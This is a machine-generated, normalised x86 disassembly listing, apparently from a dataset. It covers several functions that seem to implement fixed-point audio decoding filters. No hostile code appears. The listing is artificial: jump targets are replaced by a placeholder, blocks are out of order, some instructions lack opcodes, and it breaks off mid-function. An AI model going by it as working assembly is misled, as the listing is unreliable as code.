xor ecx esi
sub ecx esi
add ecx edi
mov [ eax + 0xc ] ecx
mov esi [ eax + 0x10 ]
mov edi [ eax + 0x8 ]
mov ecx esi
sub ecx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
sar ecx 0x1
add ecx esi
mov esi edi
imul esi ecx
add esi 0x200
sar esi 0xa
add esi [ edx ]
test ecx ecx
mov [ eax + 0x10 ] esi
je r-xdata
pop edi
pop esi
xor esi ecx
mov ecx [ eax + 0x64 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x6c ] ecx
sub_40af20
push ecx
push ebx
push esi
mov esi edx
mov edx [ eax ]
push edi
mov edi [ eax + 0x60 ]
lea ebx [ esi + ecx * 8 ]
xor ecx ecx
and edx 0x7
and edi 0x7
cmp esi ebx
mov [ esp + 0xc ] ebx
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
push ebp
mov ebx [ eax + ecx * 4 + 0x70 ]
imul ebx [ eax + 0x68 ]
mov ebp [ eax + edx * 4 + 0x10 ]
add ebx 0x200
sar ebx 0xa
add ebx ebp
mov [ eax + edi * 4 + 0x70 ] ebx
mov [ esi ] ebx
cmp [ eax + ecx * 4 + 0x70 ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov ebx [ eax + 0xc ]
imul ebx [ eax + ecx * 4 + 0x30 ]
mov ebp [ esi + 0x4 ]
add ebx 0x200
sar ebx 0xa
add ebx ebp
mov [ eax + edx * 4 + 0x30 ] ebx
cmp [ eax + ecx * 4 + 0x30 ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov ebx [ eax + ecx * 4 + 0x10 ]
xor ebx ebp
mov ebp [ eax + 0x4 ]
sar ebx 0x1f
xor ebp ebx
sub ebp ebx
add [ eax + 0x8 ] ebp
mov ebx [ eax + ecx * 4 + 0x90 ]
imul ebx [ eax + 0x6c ]
mov ebp [ eax + edx * 4 + 0x30 ]
add ebx 0x200
sar ebx 0xa
add ebx ebp
mov [ eax + edi * 4 + 0x90 ] ebx
mov [ esi + 0x4 ] ebx
cmp [ eax + ecx * 4 + 0x90 ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov ebx [ eax + ecx * 4 + 0x70 ]
xor ebx ebp
mov ebp [ eax + 0x64 ]
sar ebx 0x1f
xor ebp ebx
sub ebp ebx
add [ eax + 0x68 ] ebp
add ecx 0x1
add edx 0x1
add edi 0x1
add esi 0x8
and ecx 0x7
and edx 0x7
and edi 0x7
cmp esi [ esp + 0x10 ]
jb r-xdata
test ebp ebp
je r-xdata
mov ebx [ eax + ecx * 4 + 0x30 ]
xor ebx ebp
mov ebp [ eax + 0x4 ]
sar ebx 0x1f
xor ebp ebx
sub ebp ebx
add [ eax + 0xc ] ebp
mov ebx [ eax + 0x8 ]
imul ebx [ eax + ecx * 4 + 0x10 ]
mov ebp [ esi ]
add ebx 0x200
sar ebx 0xa
add ebx ebp
mov [ eax + edx * 4 + 0x10 ] ebx
cmp [ eax + ecx * 4 + 0x10 ] 0x0
je r-xdata
pop ebp
mov ebx [ eax + ecx * 4 + 0x90 ]
xor ebx ebp
mov ebp [ eax + 0x64 ]
sar ebx 0x1f
xor ebp ebx
sub ebp ebx
add [ eax + 0x6c ] ebp
sub_40b060
sub esp 0x20
mov ecx [ eax + 0x170 ]
push ebx
push esi
mov esi [ eax + ecx * 4 + 0x17c ]
mov eax [ esi + 0x18 ]
test al 0x8
mov [ esp + 0x14 ] eax
je r-xdata
mov [ esp + 0x18 ] 0x0
cmp [ esi + 0x74 ] 0x0
mov [ esp + 0x18 ] 0x1
je r-xdata
test eax 0x100
push ebp
push edi
je r-xdata
test eax 0x40000004
mov eax [ esp + 0x30 ]
jne r-xdata
mov ebx eax
shr ebx 0xd
and ebx 0x1f
test al al
mov [ esp + 0x24 ] ebx
jns r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
test eax 0x40000004
je r-xdata
mov edx [ esp + 0x2c ]
push eax
push edx
push esi
call sub_40d980
add esp 0xc
pop esi
pop ebx
add esp 0x20
retn
add eax eax
test ebx ebx
je r-xdata
and eax 0x3
sub eax 0x0
je r-xdata
mov ecx [ esp + 0x38 ]
lea edx [ ecx + ecx ]
mov [ esp + 0x18 ] edx
mov eax [ esp + 0x38 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
pop edi
pop ebp
pop esi
pop ebx
add esp 0x20
retn
test eax 0x40000004
mov edx [ esp + 0x38 ]
jne r-xdata
mov eax 0xffffff80
mov edx 0x7f
sub eax 0x1
je r-xdata
test ebp ebp
mov esi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
jne r-xdata
cmp [ esp + 0x18 ] 0x0
mov ebx [ esi + 0xb0 ]
je r-xdata
movzx eax [ esi + 0x119 ]
movzx ecx [ esi + 0x11a ]
movzx ebp [ esi + 0x118 ]
movzx edx [ esi + 0x11b ]
mov edi [ esp + 0x34 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] ecx
mov eax 0x1
mov ecx ebp
shl eax cl
mov [ esp + 0x28 ] edx
sub eax 0x1
cmp [ esi + 0xf8 ] 0x0
mov [ esp + 0x24 ] eax
je r-xdata
test edx edx
je r-xdata
lea eax [ edx + edx ]
mov edx eax
cmp [ esp + 0x38 ] 0x0
je r-xdata
mov ecx [ esp + 0x38 ]
add ecx ecx
mov [ esp + 0x38 ] ecx
mov eax 0xffff8000
mov edx 0x7fff
jmp r-xdata
sub eax 0x1
mov ecx ebx
je r-xdata
add edx esi
add edx eax
add edx ebp
add ebx edx
lea ecx [ edx + esi ]
add ecx eax
je r-xdata
mov [ esi + 0xb0 ] ebx
mov ebx [ esp + 0x2c ]
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x34 ]
mov ecx ebx
shl [ eax ] cl
sub edx 0x1
add eax 0x4
test edx edx
mov [ esp + 0x34 ] eax
jne r-xdata
jmp r-xdata
mov ecx ebx
mov eax 0xff800000
mov edx 0x7fffff
jmp r-xdata
mov eax 0x80000000
mov edx 0x7fffffff
jmp r-xdata
cmp [ esp + 0x20 ] ebp
je r-xdata
mov eax [ esp + 0x1c ]
sub [ esp + 0x18 ] 0x1
cmp ebp [ esi + 0x104 ]
jle r-xdata
mov ecx [ esp + 0x34 ]
mov esi [ ecx ]
sub [ esp + 0x38 ] 0x1
cmp esi eax
jge r-xdata
sar eax cl
mov ecx ebx
sar edx cl
mov edi eax
shl edi cl
mov ebp edx
shl ebp cl
test [ esp + 0x1c ] 0x40000004
jne r-xdata
mov ebp [ esp + 0x18 ]
test ebp ebp
je r-xdata
mov ecx [ esp + 0x1c ]
and ecx 0x3
mov eax [ esi + 0x104 ]
cmp eax 0x20
mov edx [ esi + 0x108 ]
jle r-xdata
lea ecx [ ecx ]
cmp esi edx
jle r-xdata
mov [ ecx ] edi
jmp r-xdata
sub ebp 0x1
test eax eax
je r-xdata
mov [ esp + 0x10 ] esi
mov [ esp + 0x14 ] eax
cmp ebx 0x8
jge r-xdata
sub eax ebp
mov [ esi + 0x104 ] eax
mov eax edx
mov ecx ebp
sub eax ebp
mov ecx 0x10
mov [ esi + 0x104 ] eax
sub cl al
mov eax [ esi + 0xf8 ]
movzx eax [ eax ]
jmp r-xdata
mov edx [ esi + 0xf8 ]
movzx eax [ edx ]
mov ecx [ esi + 0x104 ]
shl eax cl
add ecx 0x10
mov [ esi + 0x104 ] ecx
or [ esi + 0x108 ] eax
cmp ebp ecx
jg r-xdata
mov eax [ esi + 0xfc ]
lea edx [ esi + 0xf0 ]
push edx
call eax
add esp 0x4
mov ecx ebx
shl esi cl
mov ecx [ esp + 0x34 ]
mov [ ecx ] esi
mov [ ecx ] ebp
jmp r-xdata
add ecx 0x4
cmp [ esp + 0x38 ] 0x0
mov [ esp + 0x34 ] ecx
jne r-xdata
test esi esi
je r-xdata
mov ecx eax
shl [ edi ] cl
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
shl eax cl
jmp r-xdata
and edx [ esp + 0x24 ]
shr eax cl
mov ecx ebp
mov [ esi + 0x108 ] eax
mov eax [ edi ]
shl eax cl
mov ecx [ esp + 0x14 ]
or eax edx
test ecx ecx
mov [ edi ] eax
je r-xdata
add [ esi + 0xf8 ] 0x2
mov eax [ esi + 0xf8 ]
cmp eax [ esi + 0xf4 ]
jne r-xdata
pop edi
pop ebp
pop esi
pop ebx
add esp 0x20
retn
test edx edx
je r-xdata
mov ecx [ edi ]
add ecx 0x1
mov [ esp + 0x2c ] ecx
mov ecx esi
mov esi [ esp + 0x2c ]
shl esi cl
sub esi 0x1
jmp r-xdata
add edi 0x4
test ebp ebp
jne r-xdata
test esi esi
je r-xdata
sub eax 0x1
add ebx 0x1
jmp r-xdata
mov ecx [ esp + 0x28 ]
test ecx ecx
je r-xdata
add eax 0x1
shl eax cl
sub eax 0x1
jmp r-xdata
mov [ edi ] eax
mov ecx [ edi ]
mov eax ecx
and eax 0x1
lea esi [ eax + ecx ]
mov ecx edx
shl esi cl
sub esi eax
mov eax [ esp + 0x14 ]
mov [ edi ] esi
mov esi [ esp + 0x10 ]
jmp r-xdata
test edx edx
je r-xdata
sub esi 0x1
add ebx 0x1
jmp r-xdata
cmp ecx 0x3
jne r-xdata
mov eax [ edi ]
movzx ecx ax
lea edx [ ebx + ebx * 2 ]
add ecx edx
sar eax 0x10
and eax 0xffff
lea ebx [ ecx + ecx * 2 ]
add ebx eax
add edi 0x4
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov edx eax
and edx 0x1
add eax edx
shl eax cl
sub eax edx
sub edx 0x1
add ebx 0x1
jmp r-xdata
sub_40b420
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x174 ]
xor eax eax
test ecx ecx
jle r-xdata
retn
push esi
push edi
add edx 0x17c
mov esi ecx
lea ebx [ ebx ]
add eax 0x1
cmp [ ecx + 0xf8 ] 0x0
je r-xdata
mov ecx [ edx ]
mov edi [ ecx + 0xac ]
cmp edi [ ecx + 0x1c ]
jne r-xdata
pop edi
pop esi
add edx 0x4
sub esi 0x1
jne r-xdata
mov edi [ ecx + 0xb0 ]
cmp edi [ ecx + 0xb4 ]
je r-xdata
sub_40b480
sub esp 0x84
mov eax [ esp + 0x88 ]
mov ecx [ eax + 0x170 ]
push ebx
mov ebx [ esp + 0x94 ]
push ebp
push esi
push edi
mov edi [ eax + ecx * 4 + 0x17c ]
mov ecx [ edi + 0x18 ]
mov edx [ edi + 0xac ]
mov [ esp + 0x20 ] ecx
shr ecx 0x12
and ecx 0x1f
mov eax 0x1
shl eax cl
mov [ esp + 0x24 ] edx
mov edx [ edi + 0xa8 ]
mov [ esp + 0x48 ] ecx
mov ecx [ edi + 0x14 ]
add eax 0x2
mov [ esp + 0x40 ] eax
mov eax [ edi + 0x10 ]
lea esi [ edx + ebx ]
lea ebp [ eax + ecx ]
cmp esi ebp
mov [ esp + 0x28 ] edi
mov [ esp + 0x18 ] 0x0
jbe r-xdata
cmp [ edi + 0x88 ] 0x0
je r-xdata
sub eax edx
add eax ecx
mov ebx eax
mov [ esp + 0xa0 ] ebx
mov edx [ esp + 0x20 ]
mov ecx edx
and ecx 0x8
je r-xdata
mov eax [ esp + 0x20 ]
and al 0x4
neg al
sbb eax eax
and eax 0xfffffffc
add eax 0x8
imul eax ebx
push eax
mov eax [ esp + 0xa0 ]
push 0x0
push eax
call sub_40fb30
add esp 0xc
add [ edi + 0xa8 ] ebx
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
add esp 0x84
retn
mov eax [ edi + 0x74 ]
test eax eax
mov ebp [ esp + 0x9c ]
jne r-xdata
cmp [ edi + 0x74 ] 0x0
jne r-xdata
xor edx edx
cmp ecx edx
je r-xdata
test edx 0x40000004
je r-xdata
mov eax [ esp + 0x40 ]
add eax eax
mov [ esp + 0x40 ] eax
cmp eax edx
je r-xdata
test [ esp + 0x20 ] 0x40000004
je r-xdata
test eax eax
jne r-xdata
test ecx ecx
lea edx [ ebp + ebx * 4 ]
mov [ esp + 0x1c ] edx
je r-xdata
mov [ esp + 0x10 ] edx
test [ esp + 0x20 ] 0x40000004
jne r-xdata
cmp ebx edx
mov [ esp + 0x30 ] ebp
mov [ esp + 0x10 ] edx
jbe r-xdata
test [ esp + 0x20 ] 0x40000004
jne r-xdata
push ebx
push ebp
push edi
call sub_40d340
add esp 0xc
mov [ esp + 0x10 ] eax
cmp ebp edx
mov [ esp + 0x10 ] ebx
mov esi ebp
jae r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x20 ]
and al 0x4
mov ecx [ esp + 0x9c ]
neg al
sbb eax eax
and eax 0xfffffffc
add eax 0x8
imul eax esi
push eax
push 0x0
push ecx
call sub_40fb30
mov eax [ esp + 0x34 ]
add esp 0xc
cmp [ eax + 0xf8 ] 0x0
mov [ eax + 0x88 ] 0x1
mov [ esp + 0x10 ] esi
je r-xdata
cmp ebx edx
mov [ esp + 0x30 ] ebp
mov [ esp + 0x10 ] edx
jbe r-xdata
mov esi [ esp + 0xa0 ]
cmp [ esp + 0x10 ] esi
je r-xdata
nop
test ecx ecx
je r-xdata
jmp r-xdata
cmp ebp [ esp + 0x1c ]
mov [ esp + 0x30 ] ebp
jae r-xdata
mov ebx edx
mov esi [ esp + 0x10 ]
mov ebp [ esp + 0x9c ]
mov edi [ esp + 0x98 ]
push esi
push ebp
mov eax edi
call sub_40b060
mov ebx [ esp + 0x28 ]
add esp 0x8
test bl bl
jns r-xdata
mov ebp [ esp + 0x28 ]
mov ebx [ ebp + 0x84 ]
add ebp 0x150
test ebx ebx
je r-xdata
add eax 0xf0
push eax
call sub_4093a0
add esp 0x4
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov ebx [ ecx + 0x84 ]
add ecx 0x150
test ebx ebx
je r-xdata
push ebx
push ebp
push edi
call sub_40d340
add esp 0xc
mov [ esp + 0x10 ] eax
lea eax [ ebp + ebx * 8 ]
cmp ebp eax
mov [ esp + 0x10 ] ebx
mov esi ebp
jae r-xdata
mov ebp [ edi + 0x84 ]
test ebp ebp
mov eax [ esp + 0x30 ]
mov ebx [ eax ]
lea ecx [ edi + 0x150 ]
je r-xdata
sub esi ebp
sar esi 0x2
mov [ esp + 0x10 ] esi
jmp r-xdata
cmp esi ebx
jb r-xdata
test ebx 0x40000000
je r-xdata
test [ edi + 0x9c ] 0x10
je r-xdata
lea eax [ ebp + 0x30 ]
lea edx [ esp + 0x38 ]
xor eax eax
push edx
xor edx edx
mov ecx edi
mov [ esp + 0x38 ] eax
mov [ esp + 0x18 ] eax
call sub_40cc40
mov esi eax
cmp esi 0x80000000
mov [ esp + 0x1c ] esi
je r-xdata
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x20 ]
add eax 0x1
and eax 0x7
test bl 0x40
mov [ esp + 0x18 ] eax
je r-xdata
mov edx [ ecx ]
mov esi [ esp + 0x18 ]
sub ebx 0x1
cmp edx 0x8
mov [ esp + 0x44 ] ebx
jle r-xdata
test [ esp + 0x20 ] 0x10
mov eax ebp
lea esi [ ebp + ebx * 8 ]
je r-xdata
mov edi 0x12
mov edi edi
mov esi [ edi + 0x84 ]
test esi esi
lea eax [ edi + 0x150 ]
je r-xdata
lea esp [ esp ]
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp eax [ esp + 0x40 ]
jg r-xdata
mov edi edi
push 0x0
xor edx edx
mov ecx edi
call sub_40cc40
mov [ esi ] eax
add esi 0x4
cmp eax 0x80000000
je r-xdata
jmp r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
add [ eax + 0xa8 ] esi
pop edi
mov [ eax + 0xac ] edx
mov eax esi
pop esi
pop ebp
pop ebx
add esp 0x84
retn
test esi esi
lea eax [ ebp + esi * 8 ]
lea ecx [ ebp + esi * 4 ]
mov edx esi
je r-xdata
test ebx 0x40000004
mov eax esi
jne r-xdata
add ebp 0x60
add eax 0x60
test ebx ebx
jne r-xdata
cmp ecx 0x8
jg r-xdata
lea eax [ esp + 0x3c ]
push eax
mov edx 0x1
mov ecx edi
call sub_40cc40
cmp eax 0x80000000
mov [ esp + 0x2c ] eax
je r-xdata
add ebp [ esp + 0x38 ]
mov edi [ esp + 0x28 ]
mov ecx [ edi + 0x128 ]
add [ edi + 0x120 ] ecx
mov ecx [ edi + 0x130 ]
mov edx [ edi + 0x120 ]
movsx eax cx
sar edx 0x10
cmp ecx eax
mov eax ecx
je r-xdata
mov eax [ ecx + esi * 4 + 0x10 ]
lea edi [ edx + esi ]
and edi 0x7
test dl 0x1
mov edx [ ecx + 0x10 ]
je r-xdata
cmp ebp esi
jae r-xdata
cmp ebp esi
jae r-xdata
test esi esi
je r-xdata
mov ecx ebx
mov edx ebp
call sub_40a0e0
jmp r-xdata
sub esi ebp
sar esi 0x2
shr esi 0x1
mov [ esp + 0x10 ] esi
jmp r-xdata
push 0x0
mov edx 0x1
mov ecx edi
call sub_40cc40
cmp eax 0x80000000
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esp + 0x30 ]
sub eax [ esp + 0x9c ]
sar eax 0x2
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x24 ]
add eax 0x1
and eax 0x7
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x30 ]
mov [ eax ] ebx
lea edx [ ebx + ecx * 2 ]
add eax 0x4
add edx ecx
cmp eax [ esp + 0x1c ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x30 ] eax
jb r-xdata
mov edi [ esp + 0x18 ]
mov eax [ ecx + edi * 4 + 0x10 ]
add edi edx
and edi 0x7
test dl 0x1
mov edx [ ecx + 0x10 ]
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x28 ]
movzx edx [ ecx + 0x11f ]
mov ecx [ edi + 0xa0 ]
sub ecx edx
add ecx 0x7f
push ecx
push eax
push ebp
call sub_40d910
add esp 0xc
lea eax [ esi + esi ]
mov ecx [ ebp ]
sub ebx 0x1
test ecx ecx
jle r-xdata
lea edx [ eax - 0x20 ]
mov esi edx
mov ecx 0x8
lea edi [ esp + 0x54 ]
[ edi ] [ esi ]
mov ecx 0x8
mov esi eax
lea edi [ esp + 0x74 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
mov esi [ esp + ecx * 4 + 0x54 ]
mov [ edx ] esi
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0x1c ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0x4 ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0x18 ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0x8 ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0x14 ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0xc ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0x10 ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0x10 ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0xc ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0x14 ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0x8 ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0x18 ] edx
mov edx [ esp + ecx * 4 + 0x54 ]
mov [ eax - 0x4 ] edx
mov edx [ esp + ecx * 4 + 0x74 ]
add ecx 0x1
and ecx 0x7
mov [ eax + 0x1c ] edx
mov [ esp + 0x18 ] ecx
mov ebx [ esp + 0x20 ]
mov ecx ebx
and ecx 0x20
mov [ esp + 0x50 ] ecx
je r-xdata
mov eax [ esp + 0x30 ]
mov [ eax ] ebp
add eax 0x4
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0xa0 ]
mov [ esp + 0x10 ] eax
jb r-xdata
imul eax edx
add eax 0x200
sar eax 0xa
sar eax 0x9
mov esi ecx
and esi 0xffff
and eax 0xffffff80
imul esi edx
imul eax edx
sar esi 0x9
lea eax [ eax + esi + 0x1 ]
sar eax 0x1
jmp r-xdata
mov edx esi
imul edx eax
add edx 0x200
sar edx 0xa
mov edx eax
sar edx 0x9
mov ebx eax
and ebx 0xffff
and edx 0xffffff80
imul ebx esi
imul edx esi
sar ebx 0x9
lea edx [ edx + ebx + 0x1 ]
mov ebx [ esp + 0x44 ]
sar edx 0x1
jmp r-xdata
lea eax [ edx + edx * 2 ]
sub eax [ ecx + 0x14 ]
mov [ ecx + 0x14 ] edx
sar eax 0x1
xor edi edi
jmp r-xdata
lea eax [ edx + edx ]
sub eax [ ecx + 0x14 ]
mov [ ecx + 0x14 ] edx
xor edi edi
jmp r-xdata
cmp ebp esi
mov ecx ebp
jae r-xdata
mov edx [ esp + 0x24 ]
lea ebx [ ebx ]
mov edx [ esp + 0x24 ]
jmp r-xdata
mov ecx ebx
mov edx ebp
call sub_40a740
mov ecx [ eax ]
cmp ecx 0x11
jne r-xdata
add eax 0x60
test esi esi
jne r-xdata
add esi 0x8
lea eax [ ebp + ebx * 8 ]
cmp esi eax
jb r-xdata
mov edi [ esp + 0x28 ]
jmp r-xdata
mov edx esi
imul edx eax
add edx 0x200
sar edx 0xa
mov edx eax
sar edx 0x9
mov ebp eax
and ebp 0xffff
and edx 0xffffff80
imul ebp esi
imul edx esi
sar ebp 0x9
lea edx [ edx + ebp + 0x1 ]
mov ebp [ esp + 0x44 ]
sar edx 0x1
jmp r-xdata
mov eax edx
sub eax [ ecx + 0x14 ]
mov [ ecx + 0x14 ] edx
sar eax 0x1
add eax edx
xor edi edi
jmp r-xdata
lea eax [ edx + edx ]
sub eax [ ecx + 0x14 ]
mov [ ecx + 0x14 ] edx
xor edi edi
jmp r-xdata
mov edi [ ecx - 0x4 ]
sub ecx 0x4
sub eax 0x4
mov [ eax ] edi
mov edi [ ecx ]
sub edx 0x1
sub eax 0x4
test edx edx
mov [ eax ] edi
jne r-xdata
mov ebp [ edi + 0x84 ]
test ebp ebp
lea ecx [ edi + 0x150 ]
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
mov ebp [ edi + 0x84 ]
add esi ecx
add edx eax
test ebp ebp
mov [ esp + 0x34 ] esi
mov [ esp + 0x14 ] edx
lea ecx [ edi + 0x150 ]
je r-xdata
mov ecx [ esp + 0x28 ]
lea edx [ esp + 0x38 ]
push edx
xor edx edx
call sub_40cc40
mov ebp eax
cmp ebp 0x80000000
je r-xdata
jmp r-xdata
mov edx [ esp + 0x38 ]
neg edx
mov [ edi + 0x130 ] edx
mov eax [ esp + 0x38 ]
sub eax esi
add ebp eax
jmp r-xdata
test edx edx
jge r-xdata
neg eax
test ebx 0x20000000
mov esi eax
je r-xdata
mov [ ecx + edi * 4 + 0x10 ] edx
add ecx 0x60
test ebx ebx
mov ebp edx
jne r-xdata
test ebp ebp
je r-xdata
add edx ebp
test eax eax
je r-xdata
mov esi [ ecx + 0x8 ]
movsx edx ax
cmp eax edx
je r-xdata
mov eax ebx
and eax 0x7
mov [ esp + 0x18 ] eax
jmp r-xdata
mov edi [ esp + 0x40 ]
mov ecx [ eax ]
lea ecx [ ecx + ecx * 2 ]
add ecx [ eax + 0x4 ]
add eax 0x8
add ecx edx
cmp eax esi
lea edx [ ecx + edx * 8 ]
jb r-xdata
mov [ esp + 0x24 ] edx
mov ecx [ eax ]
sar ecx 0x1
sub [ eax + 0x4 ] ecx
mov ecx [ eax + 0x4 ]
add [ eax ] ecx
mov ecx [ eax ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx + edx * 8 ]
add ecx [ eax + 0x4 ]
add eax 0x8
add edx ecx
cmp eax esi
jb r-xdata
sub esi 0x1
cmp [ esp + 0x48 ] 0x10
jb r-xdata
cmp ecx edi
jne r-xdata
mov edx [ eax + 0x60 ]
cmp edx ecx
jne r-xdata
push 0x0
xor edx edx
mov ecx edi
call sub_40cc40
cmp eax 0x80000000
mov [ esi ] eax
je r-xdata
jmp r-xdata
mov [ ecx + edi * 4 + 0x10 ] edx
add ecx 0x60
test ebp ebp
mov ebx edx
jne r-xdata
test ebx ebx
je r-xdata
add edx ebx
test eax eax
je r-xdata
mov esi [ ecx + 0x8 ]
movsx edx ax
cmp eax edx
je r-xdata
mov eax [ esp + 0x18 ]
add eax 0x1
and eax 0x7
cmp [ esp + 0x50 ] 0x0
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x1c ]
jne r-xdata
mov ebx [ ecx ]
sub ebp 0x1
test ebx ebx
mov [ esp + 0x44 ] ebp
jle r-xdata
test bl 0x10
je r-xdata
mov edi edi
mov eax [ esp + 0x24 ]
lea ecx [ ebp + eax * 2 ]
add ecx eax
mov eax ebp
cdq
xor eax edx
sub eax edx
cmp eax [ esp + 0x40 ]
mov [ esp + 0x24 ] ecx
jg r-xdata
test esi esi
je r-xdata
xor eax ebp
mov ebp [ ecx + 0x4 ]
sar eax 0x1f
xor ebp eax
sub ebp eax
add ebp esi
mov [ ecx + 0x8 ] ebp
sub ecx ebp
sar ecx 0x2
shr ecx 0x1
mov [ esp + 0x10 ] ecx
mov eax [ ecx + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax edi
jg r-xdata
jmp r-xdata
cmp ecx 0x1
jl r-xdata
cmp [ eax + 0x60 ] edi
jne r-xdata
cmp edx edi
jne r-xdata
mov ecx ebx
mov edx ebp
call sub_40acb0
sub esi 0x1
add eax 0x60
jmp r-xdata
mov edx [ ecx ]
sub ebp 0x1
cmp edx 0x8
mov [ esp + 0x44 ] ebp
jle r-xdata
xor eax ebx
mov ebx [ ecx + 0x4 ]
sar eax 0x1f
xor ebx eax
sub ebx eax
add ebx esi
mov [ ecx + 0x8 ] ebx
mov ebp [ esp + 0x34 ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
lea ebp [ eax + ecx ]
mov ecx [ esp + 0x2c ]
add ecx edx
test bl 0x10
mov [ esp + 0x14 ] ecx
je r-xdata
cmp ebx 0xffffffff
jne r-xdata
cmp ebx 0x8
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx esi
sar ecx 0x1
sub eax ecx
add esi eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x34 ] esi
cmp ebx 0xffffffff
jne r-xdata
cmp ebx 0x8
jle r-xdata
cmp esi ecx
jne r-xdata
add ecx 0x40
cmp ecx esi
jb r-xdata
cmp ecx 0x7
jg r-xdata
mov ecx ebx
mov edx ebp
call sub_40ade0
sub esi 0x1
add eax 0x60
jmp r-xdata
mov ecx ebx
mov edx ebp
call sub_40ab80
sub esi 0x1
add eax 0x60
jmp r-xdata
test bl 0x40
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx eax
sar edx 0x1
sub ecx edx
mov [ esp + 0x2c ] ecx
add eax ecx
mov edx ebp
sar edx 0x1
sub ecx edx
mov [ esp + 0x14 ] ecx
add ebp ecx
jmp r-xdata
mov edx [ ecx + 0x30 ]
movsx eax dx
cmp edx eax
je r-xdata
mov edi [ ecx + 0x10 ]
mov edx [ ecx + 0x8 ]
movsx eax di
cmp edi eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ ecx + eax * 4 + 0x10 ]
mov esi [ ecx + eax * 4 + 0x30 ]
add eax ebx
and eax 0x7
mov [ esp + 0x48 ] eax
test bl 0x1
mov edi [ ecx + 0x10 ]
mov ebp [ ecx + 0x30 ]
je r-xdata
mov eax [ ecx + 0x30 ]
movsx edx ax
cmp eax edx
je r-xdata
mov eax [ ecx + 0x10 ]
movsx edx ax
cmp eax edx
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ ecx + eax * 4 + 0x10 ]
mov esi [ ecx + eax * 4 + 0x30 ]
test bl 0x1
je r-xdata
mov ecx esi
sub ecx [ esp + 0x38 ]
mov [ edi + 0x130 ] ecx
mov eax [ esp + 0x38 ]
sub eax esi
add ebp eax
jmp r-xdata
test esi esi
jge r-xdata
mov eax [ ecx ]
cdq
xor eax edx
sub eax edx
cmp eax edi
jg r-xdata
mov eax ebx
and eax 0x7
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ eax + 0x60 ]
cmp ecx 0x1
jl r-xdata
mov ecx [ esp + 0x14 ]
mov esi ebp
mov edi [ esp + 0x28 ]
mov ecx ebp
sub ecx eax
mov [ esp + 0x38 ] ecx
mov edx [ edi + 0x128 ]
add [ edi + 0x120 ] edx
mov eax [ edi + 0x120 ]
mov edx [ edi + 0x130 ]
sar eax 0x10
mov esi eax
movsx eax dx
cmp edx eax
je r-xdata
test bl 0x10
je r-xdata
mov esi [ ecx + 0xc ]
imul esi edx
add esi 0x200
sar esi 0xa
mov eax [ ecx + 0xc ]
mov esi edx
sar esi 0x9
mov edi edx
and edi 0xffff
and esi 0xffffff80
imul edi eax
imul esi eax
sar edi 0x9
lea esi [ esi + edi + 0x1 ]
sar esi 0x1
jmp r-xdata
mov esi edx
imul esi edi
add esi 0x200
sar esi 0xa
mov eax edi
sar eax 0x9
mov esi edi
and esi 0xffff
imul esi edx
and eax 0xffffff80
imul eax edx
sar esi 0x9
lea esi [ eax + esi + 0x1 ]
sar esi 0x1
jmp r-xdata
mov edi eax
imul edi edx
add edi 0x200
sar edi 0xa
mov edi edx
sar edi 0x9
mov ebx edx
and ebx 0xffff
